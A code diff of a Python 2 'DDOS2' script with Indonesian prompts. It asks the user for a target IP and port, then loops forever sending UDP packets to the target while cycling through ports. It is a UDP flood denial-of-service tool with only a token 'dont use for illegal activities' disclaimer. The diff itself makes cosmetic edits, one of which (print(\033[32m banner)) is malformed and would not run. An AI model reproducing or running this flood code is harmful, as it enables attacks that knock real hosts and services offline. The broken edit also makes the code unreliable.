@@ -23,7 +23,7 @@ os.system("clear")
 #terminal display DDOS 2 as figlet
 os.system("figlet -f mono12 DDOS2")
 
-#display text use echo
+#display text use echo (print)? Hehe
 os.system("      echo 'dont use for illegal activities'")
 time.sleep(1)
 
@@ -40,9 +40,9 @@ banner="""
 #display bannerku
 
 GREEN   = '\033[32m'
-CYAN    = '\033[46m'
+CYAN    = '\033[36m'
 
-print(GREEN+banner)
+print(\033[32m banner)
 
 ip = raw_input("Masukkan Ip : ")
 port = input("Masukkan Port : ")
@@ -52,6 +52,7 @@ os.system("clear")
 
 time.sleep(0.5)
 os.system("echo '....Attack Starting....'")
+time.sleep(1)
 os.system("clear")
 time.sleep(1)
 print("....Wait a seccond...")
@@ -62,7 +63,7 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "\033[46m sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print "\033[36m sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
 #Maaf jika ada Kesalahan , tolong tegur :)
